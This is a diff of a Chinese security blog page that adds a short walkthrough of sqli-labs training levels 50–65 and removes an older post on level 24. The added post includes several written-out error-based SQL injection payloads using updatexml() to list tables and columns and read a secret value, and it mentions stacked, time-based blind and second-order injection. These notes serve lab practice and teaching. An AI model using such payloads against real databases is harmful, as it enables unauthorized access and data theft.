@@ -71,6 +71,58 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-30" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/18/page-30/" class="article-date">
+  <time class="dt-published" datetime="2021-02-18T09:50:50.000Z" itemprop="datePublished">2021-02-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/18/page-30/">sqlilabs 50 51 52 53 54 55 56 57 58-65</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>50 51 这两关是堆叠注入没什么差别好像除了51有个单引号</p>
+<p>52 53 又关闭了报错 然后堆叠也可以弄一弄 用sqlmap 直接解决</p>
+<p>54 单引号 55括号 56 ‘) 57”  54-57这几关有次数限制 然后和之前用union select 的一样就获取数据的</p>
+<p>要获取的是secret_（后面这串是随机的） 这个列里头的数据 获取玩提交一下就可以了</p>
+<p>58 先随便试一试 存在报错信息  而且union select的没有回显只好用报错了</p>
+<p>?id=0’ and updatexml(1,(select concat(1,(select table_name from information_schema.tables where table_schema=’challenges))),1) –+   查表</p>
+<p>?id=0’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’mz8xr9yz2a’),0x7e),1)–+ 查列</p>
+<p>?id=0’ and updatexml(1,concat(0x7e,(select secret_VP4R from challenges.mz8xr9yz2a),0x7e),1) –+ 查到数据提交就ok了</p>
+<p>59数字型?id=0 其余同上一关</p>
+<p>60 ?id=0”) 61 ?id=0’)) </p>
+<p>62关了报错 但是存在明显延迟时间盲注 那就用sqlmap吧  62手动注入’)</p>
+<p>63 手动注入的话单引号闭合</p>
+<p>64 俩括号 </p>
+<p>65双引号加个括号 这几关都是时间盲注 用sqlmap吧 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/18/page-30/" data-id="ckroqtfln000jyww75y9rdob9" data-title="sqlilabs 50 51 52 53 54 55 56 57 58-65" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-29" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/02/18/page-29/" class="article-date">
@@ -504,50 +556,6 @@
 
 
   
-    <article id="post-page-17" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/02/01/page-17/" class="article-date">
-  <time class="dt-published" datetime="2021-02-01T07:53:05.000Z" itemprop="datePublished">2021-02-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/02/01/page-17/">sqli-labs less 24</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>a这关就<img src="https://img-blog.csdnimg.cn/20200713184411840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkwMTAzOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>给了个这样的界面 从创建新用户那点进去然后新建一个username为admin’# 密码随便 </p>
-<p>记住就行待会</p>
-<p><img src="https://img-blog.csdnimg.cn/20200713184953444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkwMTAzOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>用admin’#登录 </p>
-<p>然后修改密码 就会发现改的其实是admin的密码 而不是admin’#的 就很神奇</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/01/page-17/" data-id="ckroqtflf0008yww7ankgb5bc" data-title="sqli-labs less 24" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -588,6 +596,10 @@
           </li>
         
           <li>
+            <a href="/2021/07/29/page-80/">CISCN2019 华东南赛区Web11</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
           </li>
         
@@ -597,10 +609,6 @@
         
           <li>
             <a href="/2021/07/21/page-77/">网鼎杯 2020 朱雀组Nmap</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
           </li>
         
       </ul>
